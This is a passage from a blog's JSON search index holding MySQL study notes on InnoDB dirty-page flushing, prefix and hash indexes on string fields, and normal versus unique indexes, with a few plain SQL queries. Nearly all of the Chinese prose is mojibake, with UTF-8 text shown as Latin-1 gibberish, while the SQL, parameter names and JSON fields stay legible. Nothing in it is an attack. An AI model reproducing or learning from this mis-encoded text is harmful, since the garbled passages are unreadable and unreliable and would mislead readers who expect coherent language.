çš„æ—¶å€™ï¼Œå°±èƒ½å°±ç€è´¦æœ¬æ˜ç¡®è´¦ç›®æƒ…å†µäº†ã€‚ è¿™ç§åœºæ™¯ï¼Œå¯¹åº”çš„å°±æ˜¯ MySQL æ­£å¸¸å…³é—­çš„æƒ…å†µã€‚è¿™æ—¶å€™ï¼ŒMySQL ä¼šæŠŠå†…å­˜çš„è„é¡µéƒ½ flush åˆ°ç£ç›˜ä¸Šï¼Œè¿™æ ·ä¸‹æ¬¡ MySQL å¯åŠ¨çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥ä»ç£ç›˜ä¸Šè¯»æ•°æ®ï¼Œå¯åŠ¨é€Ÿåº¦ä¼šå¾ˆå¿«ã€‚ å››ç§åœºæ™¯å¯¹åº”æ€§èƒ½åˆ†æ å…¶ä¸­ï¼Œç¬¬ä¸‰ç§æƒ…å†µæ˜¯å±äº MySQL ç©ºé—²æ—¶çš„æ“ä½œï¼Œè¿™æ—¶ç³»ç»Ÿæ²¡ä»€ä¹ˆå‹åŠ›ï¼Œè€Œç¬¬å››ç§åœºæ™¯æ˜¯æ•°æ®åº“æœ¬æ¥å°±è¦å…³é—­äº†ã€‚è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œä½ ä¸ä¼šå¤ªå…³æ³¨â€œæ€§èƒ½â€é—®é¢˜ã€‚æ‰€ä»¥è¿™é‡Œï¼Œæˆ‘ä»¬ä¸»è¦æ¥åˆ†æä¸€ä¸‹å‰ä¸¤ç§åœºæ™¯ä¸‹çš„æ€§èƒ½é—®é¢˜ã€‚ ç¬¬ä¸€ç§æ˜¯â€œredo log å†™æ»¡äº†ï¼Œè¦ flush è„é¡µâ€ï¼Œè¿™ç§æƒ…å†µæ˜¯ InnoDB è¦å°½é‡é¿å…çš„ã€‚å› ä¸ºå‡ºç°è¿™ç§æƒ…å†µçš„æ—¶å€™ï¼Œæ•´ä¸ªç³»ç»Ÿå°±ä¸èƒ½å†æ¥å—æ›´æ–°äº†ï¼Œæ‰€æœ‰çš„æ›´æ–°éƒ½å¿…é¡»å µä½ã€‚å¦‚æœä½ ä»ç›‘æ§ä¸Šçœ‹ï¼Œè¿™æ—¶å€™æ›´æ–°æ•°ä¼šè·Œä¸º 0ã€‚ ç¬¬äºŒç§æ˜¯â€œå†…å­˜ä¸å¤Ÿç”¨äº†ï¼Œè¦å…ˆå°†è„é¡µå†™åˆ°ç£ç›˜â€ï¼Œè¿™ç§æƒ…å†µå…¶å®æ˜¯å¸¸æ€ã€‚InnoDB ç”¨ç¼“å†²æ± ï¼ˆbuffer poolï¼‰ç®¡ç†å†…å­˜ï¼Œç¼“å†²æ± ä¸­çš„å†…å­˜é¡µæœ‰ä¸‰ç§çŠ¶æ€ï¼š ç¬¬ä¸€ç§æ˜¯ï¼Œè¿˜æ²¡æœ‰ä½¿ç”¨çš„ï¼›ç¬¬äºŒç§æ˜¯ï¼Œä½¿ç”¨äº†å¹¶ä¸”æ˜¯å¹²å‡€é¡µï¼›ç¬¬ä¸‰ç§æ˜¯ï¼Œä½¿ç”¨äº†å¹¶ä¸”æ˜¯è„é¡µã€‚InnoDB çš„ç­–ç•¥æ˜¯å°½é‡ä½¿ç”¨å†…å­˜ï¼Œå› æ­¤å¯¹äºä¸€ä¸ªé•¿æ—¶é—´è¿è¡Œçš„åº“æ¥è¯´ï¼Œæœªè¢«ä½¿ç”¨çš„é¡µé¢å¾ˆå°‘ã€‚ è€Œå½“è¦è¯»å…¥çš„æ•°æ®é¡µæ²¡æœ‰åœ¨å†…å­˜çš„æ—¶å€™ï¼Œå°±å¿…é¡»åˆ°ç¼“å†²æ± ä¸­ç”³è¯·ä¸€ä¸ªæ•°æ®é¡µã€‚è¿™æ—¶å€™åªèƒ½æŠŠæœ€ä¹…ä¸ä½¿ç”¨çš„æ•°æ®é¡µä»å†…å­˜ä¸­æ·˜æ±°æ‰ï¼šå¦‚æœè¦æ·˜æ±°çš„æ˜¯ä¸€ä¸ªå¹²å‡€é¡µï¼Œå°±ç›´æ¥é‡Šæ”¾å‡ºæ¥å¤ç”¨ï¼›ä½†å¦‚æœæ˜¯è„é¡µå‘¢ï¼Œå°±å¿…é¡»å°†è„é¡µå…ˆåˆ·åˆ°ç£ç›˜ï¼Œå˜æˆå¹²å‡€é¡µåæ‰èƒ½å¤ç”¨ã€‚ æ‰€ä»¥ï¼Œåˆ·è„é¡µè™½ç„¶æ˜¯å¸¸æ€ï¼Œä½†æ˜¯å‡ºç°ä»¥ä¸‹è¿™ä¸¤ç§æƒ…å†µï¼Œéƒ½æ˜¯ä¼šæ˜æ˜¾å½±å“æ€§èƒ½çš„ï¼š ä¸€ä¸ªæŸ¥è¯¢è¦æ·˜æ±°çš„è„é¡µä¸ªæ•°å¤ªå¤šï¼Œä¼šå¯¼è‡´æŸ¥è¯¢çš„å“åº”æ—¶é—´æ˜æ˜¾å˜é•¿ï¼› æ—¥å¿—å†™æ»¡ï¼Œæ›´æ–°å…¨éƒ¨å µä½ï¼Œå†™æ€§èƒ½è·Œä¸º 0ï¼Œè¿™ç§æƒ…å†µå¯¹æ•æ„Ÿä¸šåŠ¡æ¥è¯´ï¼Œæ˜¯ä¸èƒ½æ¥å—çš„ã€‚ æ‰€ä»¥ï¼ŒInnoDB éœ€è¦æœ‰æ§åˆ¶è„é¡µæ¯”ä¾‹çš„æœºåˆ¶ï¼Œæ¥å°½é‡é¿å…ä¸Šé¢çš„è¿™ä¸¤ç§æƒ…å†µã€‚ InnoDB åˆ·è„é¡µçš„æ§åˆ¶ç­–ç•¥ innodb_io_capacity è¿™ä¸ªå‚æ•°å¯ä»¥è®¾ç½®ç£ç›˜çš„ I/O èƒ½åŠ›ï¼Œä¸èƒ½è®¾ç½®å¤ªå°ï¼Œä¼šå¯¼è‡´åˆ·è„é¡µçš„é€Ÿåº¦å˜æ…¢ã€‚ innodb_max_dirty_pages_pct ç”¨æ¥è®¾ç½®è„é¡µæ¯”ä¾‹ä¸Šé™ï¼Œé»˜è®¤å€¼æ˜¯ 75%ã€‚ InnoDB ä¼šåœ¨åå°åˆ·è„é¡µï¼Œè€Œåˆ·è„é¡µçš„è¿‡ç¨‹æ˜¯è¦å°†å†…å­˜é¡µå†™å…¥ç£ç›˜ã€‚æ‰€ä»¥ï¼Œæ— è®ºæ˜¯ä½ çš„æŸ¥è¯¢è¯­å¥åœ¨éœ€è¦å†…å­˜çš„æ—¶å€™å¯èƒ½è¦æ±‚æ·˜æ±°ä¸€ä¸ªè„é¡µï¼Œè¿˜æ˜¯ç”±äºåˆ·è„é¡µçš„é€»è¾‘ä¼šå ç”¨ IO èµ„æºå¹¶å¯èƒ½å½±å“åˆ°äº†ä½ çš„æ›´æ–°è¯­å¥ï¼Œéƒ½å¯èƒ½æ˜¯é€ æˆä½ ä»ä¸šåŠ¡ç«¯æ„ŸçŸ¥åˆ° MySQLâ€œæŠ–â€äº†ä¸€ä¸‹çš„åŸå› ã€‚ è¦å°½é‡é¿å…è¿™ç§æƒ…å†µï¼Œä½ å°±è¦åˆç†åœ°è®¾ç½® innodb_io_capacity çš„å€¼ï¼Œå¹¶ä¸”å¹³æ—¶è¦å¤šå…³æ³¨è„é¡µæ¯”ä¾‹ï¼Œä¸è¦è®©å®ƒç»å¸¸æ¥è¿‘ 75%ã€‚ æ€»ç»“ å½“å†…å­˜æ•°æ®é¡µè·Ÿç£ç›˜æ•°æ®é¡µå†…å®¹ä¸ä¸€è‡´çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªå†…å­˜é¡µä¸ºâ€œè„é¡µâ€ã€‚å†…å­˜æ•°æ®å†™å…¥åˆ°ç£ç›˜åï¼Œå†…å­˜å’Œç£ç›˜ä¸Šçš„æ•°æ®é¡µçš„å†…å®¹å°±ä¸€è‡´äº†ï¼Œç§°ä¸ºâ€œå¹²å‡€é¡µâ€ã€‚ æŠŠå†…å­˜é‡Œçš„æ•°æ®å†™å…¥ç£ç›˜çš„è¿‡ç¨‹ï¼Œå«åš flush å¹³æ—¶æ„ŸçŸ¥åˆ° MySQLâ€œæŠ–â€äº†ä¸€ä¸‹ï¼Œå¯èƒ½å°±æ˜¯å› ä¸ºåˆšåˆšåœ¨åˆ·è„é¡µï¼ˆflushï¼‰ å¯ä»¥é€šè¿‡ä¸€äº›å‚æ•°è®¾ç½®ç£ç›˜ I/O èƒ½åŠ›ï¼Œæé«˜åˆ·è„é¡µçš„é€Ÿåº¦","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"11 æ€ä¹ˆç»™å­—ç¬¦ä¸²å­—æ®µåŠ ç´¢å¼•","slug":"how-to-add-an-index-to-a-string-field","date":"2022-06-20T15:14:09.000Z","updated":"2022-06-27T08:17:37.103Z","comments":true,"path":"how-to-add-an-index-to-a-string-field/","link":"","permalink":"https://www.0x2beace.com/how-to-add-an-index-to-a-string-field/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š ææ¸…æ¥šæ€ä¹ˆç»™å­—ç¬¦ä¸²å­—æ®µåŠ ç´¢å¼• äº†è§£å‰ç¼€ç´¢å¼•å¯¹è¦†ç›–ç´¢å¼•çš„å½±å“","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š ææ¸…æ¥šæ€ä¹ˆç»™å­—ç¬¦ä¸²å­—æ®µåŠ ç´¢å¼• äº†è§£å‰ç¼€ç´¢å¼•å¯¹è¦†ç›–ç´¢å¼•çš„å½±å“ å‰ç¼€ç´¢å¼•ä¸å…¨å­—æ®µç´¢å¼•MySQL æ˜¯æ”¯æŒå‰ç¼€ç´¢å¼•çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥å®šä¹‰å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ä½œä¸ºç´¢å¼•ã€‚é»˜è®¤åœ°ï¼Œå¦‚æœä½ åˆ›å»ºç´¢å¼•çš„è¯­å¥ä¸æŒ‡å®šå‰ç¼€é•¿åº¦ï¼Œé‚£ä¹ˆç´¢å¼•å°±ä¼šåŒ…å«æ•´ä¸ªå­—ç¬¦ä¸²ã€‚ å¯¹äºå‰ç¼€ç´¢å¼•å’Œå…¨å­—æ®µç´¢å¼•æ¥è¯´ï¼Œè¿™ä¸¤ç§ä¸åŒçš„å®šä¹‰åœ¨æ•°æ®ç»“æ„å’Œå­˜å‚¨ä¸Šæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ å…¨å­—æ®µç´¢å¼•ï¼š å‰ç¼€ç´¢å¼•ï¼š ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå‰ç¼€ç´¢å¼•ç»“æ„ä¸­æ¯ä¸ªé‚®ç®±å­—æ®µéƒ½åªå–å‰ 6 ä¸ªå­—èŠ‚ï¼ˆå³ï¼šzhangsï¼‰ï¼Œæ‰€ä»¥å ç”¨çš„ç©ºé—´ä¼šæ›´å°ï¼Œè¿™å°±æ˜¯ä½¿ç”¨å‰ç¼€ç´¢å¼•çš„ä¼˜åŠ¿ã€‚ ä½†ï¼Œè¿™åŒæ—¶å¸¦æ¥çš„æŸå¤±æ˜¯ï¼Œå¯èƒ½ä¼šå¢åŠ é¢å¤–çš„è®°å½•æ‰«ææ¬¡æ•°ã€‚ æ¥ä¸‹æ¥ä»å¾®è§‚çš„è§’åº¦æ¥çœ‹ä¸€ä¸‹ï¼Œåœ¨è¿™ä¸¤ä¸ªä¸åŒçš„ç´¢å¼•ä¸‹ï¼Œæ‰§è¡Œè¿‡ç¨‹åˆ†åˆ«æ˜¯æ€æ ·çš„ã€‚ å¦‚æœä½¿ç”¨çš„æ˜¯ index1ï¼ˆå³ email æ•´ä¸ªå­—ç¬¦ä¸²çš„ç´¢å¼•ç»“æ„ï¼‰ï¼Œæ‰§è¡Œé¡ºåºæ˜¯è¿™æ ·çš„ï¼š ä» index1 ç´¢å¼•æ ‘æ‰¾åˆ°æ»¡è¶³ç´¢å¼•å€¼æ˜¯â€™zhangssxyz@xxx.comâ€™çš„è¿™æ¡è®°å½•ï¼Œå–å¾— ID2 çš„å€¼ï¼› åˆ°ä¸»é”®ä¸ŠæŸ¥åˆ°ä¸»é”®å€¼æ˜¯ ID2 çš„è¡Œï¼Œåˆ¤æ–­ email çš„å€¼æ˜¯æ­£ç¡®çš„ï¼Œå°†è¿™è¡Œè®°å½•åŠ å…¥ç»“æœé›†ï¼› å– index1 ç´¢å¼•æ ‘ä¸ŠåˆšåˆšæŸ¥åˆ°çš„ä½ç½®çš„ä¸‹ä¸€æ¡è®°å½•ï¼Œå‘ç°å·²ç»ä¸æ»¡è¶³ email=â€™zhangssxyz@xxx.comâ€™çš„æ¡ä»¶äº†ï¼Œå¾ªç¯ç»“æŸã€‚ è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œåªéœ€è¦å›ä¸»é”®ç´¢å¼•å–ä¸€æ¬¡æ•°æ®ï¼Œæ‰€ä»¥ç³»ç»Ÿè®¤ä¸ºåªæ‰«æäº†ä¸€è¡Œã€‚ å¦‚æœä½¿ç”¨çš„æ˜¯ index2ï¼ˆå³ email(6) ç´¢å¼•ç»“æ„ï¼‰ï¼Œæ‰§è¡Œé¡ºåºæ˜¯è¿™æ ·çš„ï¼š ä» index2 ç´¢å¼•æ ‘æ‰¾åˆ°æ»¡è¶³ç´¢å¼•å€¼æ˜¯â€™zhangsâ€™çš„è®°å½•ï¼Œæ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæ˜¯ ID1ï¼› åˆ°ä¸»é”®ä¸ŠæŸ¥åˆ°ä¸»é”®å€¼æ˜¯ ID1 çš„è¡Œï¼Œåˆ¤æ–­å‡º email çš„å€¼ä¸æ˜¯â€™zhangssxyz@xxx.comâ€™ï¼Œè¿™è¡Œè®°å½•ä¸¢å¼ƒï¼› å– index2 ä¸ŠåˆšåˆšæŸ¥åˆ°çš„ä½ç½®çš„ä¸‹ä¸€æ¡è®°å½•ï¼Œå‘ç°ä»ç„¶æ˜¯â€™zhangsâ€™ï¼Œå–å‡º ID2ï¼Œå†åˆ° ID ç´¢å¼•ä¸Šå–æ•´è¡Œç„¶ååˆ¤æ–­ï¼Œè¿™æ¬¡å€¼å¯¹äº†ï¼Œå°†è¿™è¡Œè®°å½•åŠ å…¥ç»“æœé›†ï¼› é‡å¤ä¸Šä¸€æ­¥ï¼Œç›´åˆ°åœ¨ idxe2 ä¸Šå–åˆ°çš„å€¼ä¸æ˜¯â€™zhangsâ€™æ—¶ï¼Œå¾ªç¯ç»“æŸ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œè¦å›ä¸»é”®ç´¢å¼•å– 4 æ¬¡æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æ‰«æäº† 4 è¡Œã€‚ ä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨å‰ç¼€ç´¢å¼•ï¼Œå®šä¹‰å¥½é•¿åº¦ï¼Œå°±å¯ä»¥åšåˆ°æ—¢èŠ‚çœç©ºé—´ï¼Œåˆä¸ç”¨é¢å¤–å¢åŠ å¤ªå¤šçš„æŸ¥è¯¢æˆæœ¬ã€‚ å‰ç¼€ç´¢å¼•å¯¹è¦†ç›–ç´¢å¼•çš„å½±å“å…ˆæ¥çœ‹çœ‹è¿™ä¸ª SQL è¯­å¥ï¼š 1select id,email from SUser where email&#x3D;&#39;zhangssxyz@xxx.com&#39;; ä¸å‰é¢ä¾‹å­ä¸­çš„ SQL è¯­å¥ 1select id,name,email from SUser where email&#x3D;&#39;zhangssxyz@xxx.com&#39;; ç›¸æ¯”ï¼Œè¿™ä¸ªè¯­å¥åªè¦æ±‚è¿”å› id å’Œ email å­—æ®µã€‚ æ‰€ä»¥ï¼Œå¦‚æœä½¿ç”¨ index1ï¼ˆå³ email æ•´ä¸ªå­—ç¬¦ä¸²çš„ç´¢å¼•ç»“æ„ï¼‰çš„è¯ï¼Œå¯ä»¥åˆ©ç”¨è¦†ç›–ç´¢å¼•ï¼Œä» index1 æŸ¥åˆ°ç»“æœåç›´æ¥å°±è¿”å›äº†ï¼Œä¸éœ€è¦å›åˆ° ID ç´¢å¼•å†å»æŸ¥ä¸€æ¬¡ã€‚è€Œå¦‚æœä½¿ç”¨ index2ï¼ˆå³ email(6) ç´¢å¼•ç»“æ„ï¼‰çš„è¯ï¼Œå°±ä¸å¾—ä¸å›åˆ° ID ç´¢å¼•å†å»åˆ¤æ–­ email å­—æ®µçš„å€¼ã€‚ å³ä½¿ä½ å°† index2 çš„å®šä¹‰ä¿®æ”¹ä¸º email(18) çš„å‰ç¼€ç´¢å¼•ï¼Œè¿™æ—¶å€™è™½ç„¶ index2 å·²ç»åŒ…å«äº†æ‰€æœ‰çš„ä¿¡æ¯ï¼Œä½† InnoDB è¿˜æ˜¯è¦å›åˆ° id ç´¢å¼•å†æŸ¥ä¸€ä¸‹ï¼Œå› ä¸ºç³»ç»Ÿå¹¶ä¸ç¡®å®šå‰ç¼€ç´¢å¼•çš„å®šä¹‰æ˜¯å¦æˆªæ–­äº†å®Œæ•´ä¿¡æ¯ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨å‰ç¼€ç´¢å¼•å°±ç”¨ä¸ä¸Šè¦†ç›–ç´¢å¼•å¯¹æŸ¥è¯¢æ€§èƒ½çš„ä¼˜åŒ–äº†ï¼Œè¿™ä¹Ÿæ˜¯ä½ åœ¨é€‰æ‹©æ˜¯å¦ä½¿ç”¨å‰ç¼€ç´¢å¼•æ—¶éœ€è¦è€ƒè™‘çš„ä¸€ä¸ªå› ç´ ã€‚ å…¶ä»–æ–¹å¼ç¬¬ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨å€’åºå­˜å‚¨ã€‚ æœ‰æ—¶å€™æœ‰äº›ä¸šåŠ¡åœºæ™¯çš„å‰ç¼€æ˜¯ä¸€æ ·çš„ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœç»§ç»­ä½¿ç”¨å‰ç¼€ç´¢å¼•ï¼Œå…¶å®æ²¡æœ‰å¤ªå¤§æ„ä¹‰ã€‚ è¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘ä½¿ç”¨å€’åºå­˜å‚¨ã€‚ ç¬¬äºŒç§æ–¹å¼æ˜¯ä½¿ç”¨ hash å­—æ®µã€‚ å¯ä»¥åœ¨è¡¨ä¸Šå†åˆ›å»ºä¸€ä¸ªæ•´æ•°å­—æ®µï¼Œæ¥ä¿å­˜å­—æ®µçš„æ ¡éªŒç ï¼ŒåŒæ—¶åœ¨è¿™ä¸ªå­—æ®µä¸Šåˆ›å»ºç´¢å¼•ã€‚ ç„¶åæ¯æ¬¡æ’å…¥æ–°è®°å½•çš„æ—¶å€™ï¼Œéƒ½åŒæ—¶ç”¨ crc32() è¿™ä¸ªå‡½æ•°å¾—åˆ°æ ¡éªŒç å¡«åˆ°è¿™ä¸ªæ–°å­—æ®µã€‚ ç”±äºæ ¡éªŒç å¯èƒ½å­˜åœ¨å†²çªï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ªä¸åŒçš„å€¼é€šè¿‡ crc32() å‡½æ•°å¾—åˆ°çš„ç»“æœå¯èƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥ä½ çš„æŸ¥è¯¢è¯­å¥ where éƒ¨åˆ†è¦åˆ¤æ–­å­—æ®µçš„å€¼æ˜¯å¦ç²¾ç¡®ç›¸åŒã€‚ è¿™æ ·ï¼Œç´¢å¼•çš„é•¿åº¦å˜æˆäº† 4 ä¸ªå­—èŠ‚ï¼Œæ¯”åŸæ¥å°äº†å¾ˆå¤šã€‚ ä½¿ç”¨å€’åºå­˜å‚¨å’Œä½¿ç”¨ hash å­—æ®µè¿™ä¸¤ç§æ–¹æ³•çš„å¼‚åŒç‚¹ã€‚ ç›¸åŒç‚¹ï¼šéƒ½ä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢ã€‚å€’åºå­˜å‚¨çš„å­—æ®µä¸Šåˆ›å»ºçš„ç´¢å¼•æ˜¯æŒ‰ç…§å€’åºå­—ç¬¦ä¸²çš„æ–¹å¼æ’åºçš„ï¼Œå·²ç»æ²¡æœ‰åŠæ³•åˆ©ç”¨ç´¢å¼•æ–¹å¼æŸ¥å‡ºèº«ä»½è¯å·ç åœ¨ [ID_X, ID_Y] çš„æ‰€æœ‰å¸‚æ°‘äº†ã€‚åŒæ ·åœ°ï¼Œhash å­—æ®µçš„æ–¹å¼ä¹Ÿåªèƒ½æ”¯æŒç­‰å€¼æŸ¥è¯¢ã€‚ å¼‚åŒç‚¹ï¼š ä»å ç”¨çš„é¢å¤–ç©ºé—´æ¥çœ‹ï¼Œå€’åºå­˜å‚¨æ–¹å¼åœ¨ä¸»é”®ç´¢å¼•ä¸Šï¼Œä¸ä¼šæ¶ˆè€—é¢å¤–çš„å­˜å‚¨ç©ºé—´ï¼Œè€Œ hash å­—æ®µæ–¹æ³•éœ€è¦å¢åŠ ä¸€ä¸ªå­—æ®µã€‚å½“ç„¶ï¼Œå€’åºå­˜å‚¨æ–¹å¼ä½¿ç”¨ 4 ä¸ªå­—èŠ‚çš„å‰ç¼€é•¿åº¦åº”è¯¥æ˜¯ä¸å¤Ÿçš„ï¼Œå¦‚æœå†é•¿ä¸€ç‚¹ï¼Œè¿™ä¸ªæ¶ˆè€—è·Ÿé¢å¤–è¿™ä¸ª hash å­—æ®µä¹Ÿå·®ä¸å¤šæŠµæ¶ˆäº†ã€‚ åœ¨ CPU æ¶ˆè€—æ–¹é¢ï¼Œå€’åºæ–¹å¼æ¯æ¬¡å†™å’Œè¯»çš„æ—¶å€™ï¼Œéƒ½éœ€è¦é¢å¤–è°ƒç”¨ä¸€æ¬¡ reverse å‡½æ•°ï¼Œè€Œ hash å­—æ®µçš„æ–¹å¼éœ€è¦é¢å¤–è°ƒç”¨ä¸€æ¬¡ crc32() å‡½æ•°ã€‚å¦‚æœåªä»è¿™ä¸¤ä¸ªå‡½æ•°çš„è®¡ç®—å¤æ‚åº¦æ¥çœ‹çš„è¯ï¼Œreverse å‡½æ•°é¢å¤–æ¶ˆè€—çš„ CPU èµ„æºä¼šæ›´å°äº›ã€‚ ä»æŸ¥è¯¢æ•ˆç‡ä¸Šçœ‹ï¼Œä½¿ç”¨ hash å­—æ®µæ–¹å¼çš„æŸ¥è¯¢æ€§èƒ½ç›¸å¯¹æ›´ç¨³å®šä¸€äº›ã€‚å› ä¸º crc32 ç®—å‡ºæ¥çš„å€¼è™½ç„¶æœ‰å†²çªçš„æ¦‚ç‡ï¼Œä½†æ˜¯æ¦‚ç‡éå¸¸å°ï¼Œå¯ä»¥è®¤ä¸ºæ¯æ¬¡æŸ¥è¯¢çš„å¹³å‡æ‰«æè¡Œæ•°æ¥è¿‘ 1ã€‚è€Œå€’åºå­˜å‚¨æ–¹å¼æ¯•ç«Ÿè¿˜æ˜¯ç”¨çš„å‰ç¼€ç´¢å¼•çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜æ˜¯ä¼šå¢åŠ æ‰«æè¡Œæ•°ã€‚ æ€»ç»“å¦‚æœæƒ³ç»™ä¸€ä¸ªå­—ç¬¦ä¸²åˆ›å»ºä¸€ä¸ªç´¢å¼•ï¼Œæœ‰å››ç§æ–¹æ¡ˆï¼š ç›´æ¥åˆ›å»ºå®Œæ•´ç´¢å¼•ï¼Œè¿™æ ·å¯èƒ½æ¯”è¾ƒå ç”¨ç©ºé—´ï¼› åˆ›å»ºå‰ç¼€ç´¢å¼•ï¼ŒèŠ‚çœç©ºé—´ï¼Œä½†ä¼šå¢åŠ æŸ¥è¯¢æ‰«ææ¬¡æ•°ï¼Œå¹¶ä¸”ä¸èƒ½ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼› å€’åºå­˜å‚¨ï¼Œå†åˆ›å»ºå‰ç¼€ç´¢å¼•ï¼Œç”¨äºç»•è¿‡å­—ç¬¦ä¸²æœ¬èº«å‰ç¼€çš„åŒºåˆ†åº¦ä¸å¤Ÿçš„é—®é¢˜ï¼› åˆ›å»º hash å­—æ®µç´¢å¼•ï¼ŒæŸ¥è¯¢æ€§èƒ½ç¨³å®šï¼Œæœ‰é¢å¤–çš„å­˜å‚¨å’Œè®¡ç®—æ¶ˆè€—ï¼Œè·Ÿç¬¬ä¸‰ç§æ–¹å¼ä¸€æ ·ï¼Œéƒ½ä¸æ”¯æŒèŒƒå›´æ‰«æ;","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"09 æ™®é€šç´¢å¼•å’Œå”¯ä¸€ç´¢å¼•ï¼Œåº”è¯¥æ€ä¹ˆé€‰æ‹©","slug":"how-to-choose-common-index-and-unique-index","date":"2022-06-19T23:12:50.000Z","updated":"2022-06-27T08:17:37.103Z","comments":true,"path":"how-to-choose-common-index-and-unique-index/","link":"","permalink":"https://www.0x2beace.com/how-to-choose-common-index-and-unique-index/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š å¯¹äºä¸åŒä¸šåŠ¡åœºæ™¯ä¸‹ï¼Œåº”è¯¥é€‰æ‹©æ™®é€šç´¢å¼•ï¼Œè¿˜æ˜¯å”¯ä¸€ç´¢å¼• ç†è§£ change buffer çš„æœºåˆ¶","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š å¯¹äºä¸åŒä¸šåŠ¡åœºæ™¯ä¸‹ï¼Œåº”è¯¥é€‰æ‹©æ™®é€šç´¢å¼•ï¼Œè¿˜æ˜¯å”¯ä¸€ç´¢å¼• ç†è§£ change buffer çš„æœºåˆ¶ å‡å¦‚ç°åœ¨éœ€è¦ç»´æŠ¤ä¸€ä¸ªå¸‚æ°‘ç³»ç»Ÿï¼Œæ¯ä¸ªäººéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„èº«ä»½è¯å·ï¼Œè€Œä¸”ä¸šåŠ¡ä»£ç å·²ç»ä¿è¯äº†ä¸ä¼šå†™å…¥ä¸¤ä¸ªé‡å¤çš„èº«ä»½è¯å·ã€‚å¦‚æœå¸‚æ°‘ç³»ç»Ÿéœ€è¦æŒ‰ç…§èº«ä»½è¯å·æŸ¥å§“åï¼Œå°±ä¼šæ‰§è¡Œç±»ä¼¼è¿™æ ·çš„ SQL è¯­å¥ï¼š 1select name from CUser where id_card &#x3D; &#39;xxxxxxxyyyyyyzzzzz&#39;; ç”±äºèº«ä»½è¯å·å­—æ®µæ¯”è¾ƒå¤§ï¼Œä¸å»ºè®®æŠŠèº«ä»½è¯å·å½“åšä¸»é”®ï¼Œé‚£ä¹ˆç°åœ¨æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œè¦ä¹ˆç»™ id_card å­—æ®µåˆ›å»ºå”¯ä¸€ç´¢å¼•ï¼Œè¦ä¹ˆåˆ›å»ºä¸€ä¸ªæ™®é€šç´¢å¼•ã€‚å¦‚æœä¸šåŠ¡ä»£ç å·²ç»ä¿è¯äº†ä¸ä¼šå†™å…¥é‡å¤çš„èº«ä»½è¯å·ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªé€‰æ‹©é€»è¾‘ä¸Šéƒ½æ˜¯æ­£ç¡®çš„ã€‚ ç°åœ¨çš„é—®é¢˜å°±æ˜¯ï¼Œä»æ€§èƒ½çš„è§’åº¦è€ƒè™‘ï¼Œé€‰æ‹©å”¯ä¸€ç´¢å¼•è¿˜æ˜¯æ™®é€šç´¢å¼•å‘¢ï¼Ÿé€‰æ‹©çš„ä¾æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ InnoDB çš„ç´¢å¼•ç»„ç»‡ç»“æ„ï¼š æŸ¥è¯¢è¿‡ç¨‹select id from T where k=5 è¿™ä¸ªæŸ¥è¯¢è¯­å¥åœ¨ç´¢å¼•æ ‘ä¸ŠæŸ¥æ‰¾çš„è¿‡ç¨‹ï¼Œå…ˆæ˜¯é€šè¿‡ B+ æ ‘ä»æ ‘æ 